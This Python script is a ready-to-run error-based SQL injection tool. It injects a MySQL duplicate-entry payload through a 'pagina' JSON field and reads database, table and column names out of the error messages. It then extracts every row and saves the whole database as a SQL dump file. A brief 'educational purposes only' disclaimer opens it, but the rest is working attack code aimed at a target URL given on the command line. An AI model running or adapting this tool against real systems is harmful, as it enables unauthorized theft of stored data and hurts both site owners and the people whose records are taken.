"""
DISCLAIMER:
This tool is intended for educational purposes only.
Use only in authorized environments.
Unauthorized use of this tool may be illegal.
"""

import argparse
import requests
import re
import time
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class SQLDumper:
    def __init__(self, url, timeout=5):
        self.url = url
        self.timeout = timeout

    def _send_payload(self, payload):
        data = {"pagina": payload, "url": "a", "agencia": 77}

        try:
            response = requests.post(
                self.url,
                json=data,
                timeout=self.timeout,
                verify=False
            )

            match = re.search(r"Duplicate entry '~([^~]+)~", response.text)
            if match:
                return match.group(1)

        except Exception:
            pass

        return None

    def _extract_list(self, query_template, offset):
        
        payload = (
            "x', (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, ("
            f"{query_template} LIMIT {offset},1"
            "), 0x7e, FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)) -- -"
        )
        return self._send_payload(payload)

    def get_databases(self):
        """Enumerates all databases."""
        databases = []
        offset = 0

        while True:
            db = self._extract_list(
                "SELECT schema_name FROM information_schema.schemata",
                offset
            )
            if not db:
                break

            databases.append(db)
            offset += 1
            time.sleep(0.5)

        return databases

    def get_tables(self, database):
      
        tables = []
        offset = 0

        db_hex = database.encode().hex()

        while True:
            query = (
                "SELECT table_name FROM information_schema.tables "
                f"WHERE table_schema=0x{db_hex}"
            )

            table = self._extract_list(query, offset)
            if not table:
                break

            tables.append(table)
            offset += 1
            time.sleep(0.5)

        return tables

    def get_columns(self, table, database=None):
        columns = []
        offset = 0

        table_hex = table.encode().hex()

        if database:
            db_hex = database.encode().hex()
            query = (
                "SELECT column_name FROM information_schema.columns "
                f"WHERE table_name=0x{table_hex} AND table_schema=0x{db_hex}"
            )
        else:
            query = (
                "SELECT column_name FROM information_schema.columns "
                f"WHERE table_name=0x{table_hex}"
            )

        while True:
            col = self._extract_list(query, offset)
            if not col:
                break

            columns.append(col)
            offset += 1
            time.sleep(0.5)

        return columns

    def get_table_data(self, table, columns, limit=None):
        data = []
        offset = 0

        concat_cols = ", ':', ".join(columns)
        concat_expr = f"CONCAT({concat_cols})" if len(columns) > 1 else columns[0]

        while True:
            query = f"SELECT {concat_expr} FROM {table} LIMIT {offset},1"
            row = self._extract_list(query, 0)

            if not row:
                break

            values = row.split(':')
            data.append(dict(zip(columns, values)))

            offset += 1
            if limit and offset >= limit:
                break

            time.sleep(0.5)

        return data

    def dump_all(self, output_file):
        
        with open(output_file, 'w', encoding='utf-8') as f:

            print("[*] Retrieving databases...")
            databases = self.get_databases()

            f.write(f"-- Databases found: {len(databases)}\n")

            for db in databases:
                f.write(f"CREATE DATABASE IF NOT EXISTS `{db}`;\n")
                f.write(f"USE `{db}`;\n\n")

                print(f"[*] Processing database: {db}")

                tables = self.get_tables(db)

                for table in tables:
                    print(f"    -> Table: {table}")

                    columns = self.get_columns(table, db)

                    f.write(f"DROP TABLE IF EXISTS `{table}`;\n")

                    create_stmt = f"CREATE TABLE `{table}` (\n"
                    for col in columns:
                        create_stmt += f"  `{col}` TEXT,\n"

                    create_stmt = create_stmt.rstrip(',\n') + "\n);\n"
                    f.write(create_stmt)

                    data = self.get_table_data(table, columns)

                    for row in data:
                        values = [str(v).replace("'", "''") for v in row.values()]

                        values_str = ", ".join(f"'{v}'" for v in values)
                        columns_str = ", ".join(f"`{c}`" for c in columns)

                        insert_stmt = (
                            f"INSERT INTO `{table}` ({columns_str}) "
                            f"VALUES ({values_str});\n"
                        )

                        f.write(insert_stmt)

                    f.write("\n")

                f.write("\n")

        print(f"[+] Dump completed. Saved to {output_file}")


def main():
    parser = argparse.ArgumentParser(
        description="Database dump via error-based SQL injection"
    )

    parser.add_argument(
        "-u", "--url",
        required=True,
        help="Target vulnerable endpoint URL"
    )

    parser.add_argument(
        "-o", "--output",
        default="dump.sql",
        help="Output file (default: dump.sql)"
    )

    parser.add_argument(
        "--timeout",
        type=float,
        default=5.0,
        help="Request timeout in seconds"
    )

    args = parser.parse_args()

    dumper = SQLDumper(args.url, args.timeout)
    dumper.dump_all(args.output)


if __name__ == "__main__":
    main()
